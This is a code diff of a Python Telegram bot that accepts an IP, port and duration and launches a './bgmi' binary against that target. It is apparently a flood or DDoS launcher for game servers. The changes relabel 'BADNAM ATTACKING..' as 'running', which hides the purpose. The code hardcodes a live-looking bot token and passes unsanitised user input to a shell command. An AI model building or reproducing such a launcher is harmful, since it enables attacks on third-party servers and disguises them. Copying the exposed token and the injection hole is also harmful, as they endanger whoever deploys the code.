@@ -11,8 +11,7 @@ import logging
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 
 # Initialize the bot with the token from environment variable
-TOKEN = '7385947182:AAGGBOpuvWeGAP2oX_-oOHiOzDxcOYiXB6E'
-
+TOKEN = "7385947182:AAGGBOpuvWeGAP2oX_-oOHiOzDxcOYiXB6E"
 bot = telebot.TeleBot(TOKEN)
 
 # List of authorized user IDs
@@ -27,7 +26,7 @@ processes = {}
 @bot.message_handler(commands=['start'])
 def send_welcome(message):
     welcome_text = (
-        "👋 *Welcome to the Action Bot!*\n\n"
+        "👋 *Welcome to the BADNAM Bot!*\n\n"
         "To initiate an action, please send a message in the format:\n"
         "`<ip> <port> <duration>`\n\n"
         "To stop all ongoing actions, send:\n"
@@ -102,7 +101,7 @@ def handle_message(message):
     <rect x="20" y="20" width="360" height="210" rx="30" ry="30" fill="url(#grad1)" />
     <circle cx="340" cy="60" r="50" fill="#ffffff" opacity="0.4"/>
     <circle cx="340" cy="60" r="35" fill="#FF6F61"/>
-    <text x="40" y="60" class="title">🚀 BADNAM ATTACKING..</text>
+    <text x="40" y="60" class="title">🚀 BADNAM running.</text>
     <text x="40" y="100" class="text">IP: {ip}</text>
     <text x="40" y="140" class="text">Port: {port}</text>
     <text x="40" y="180" class="text">Duration: {duration} seconds</text>
@@ -119,7 +118,7 @@ def handle_message(message):
             bot.send_photo(message.chat.id, image_file, caption="🚀 *Action started!*", parse_mode='Markdown')
 
             # Run the action command
-            full_command = "/bgmi {ip} {port} {duration}"
+            full_command = f"./bgmi {ip} {port} {duration}"
             process = subprocess.Popen(full_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
             processes[process.pid] = {'process': process, 'ip': ip, 'port': port, 'duration': duration}
 
@@ -170,7 +169,7 @@ def check_process_status(message, process, ip, port, duration):
     <rect x="20" y="20" width="360" height="210" rx="20" ry="20" fill="url(#grad2)" />
     <circle cx="350" cy="50" r="30" fill="#ffffff" opacity="0.4"/>
     <circle cx="350" cy="50" r="20" fill="#34C759"/>
-    <text x="40" y="60" class="title">✅ BADNAM Complete!</text>
+    <text x="40" y="60" class="title">✅ BADNAM finished!</text>
     <text x="40" y="100" class="text">IP: {ip}</text>
     <text x="40" y="140" class="text">Port: {port}</text>
     <text x="40" y="180" class="text">Duration: {duration} seconds</text>
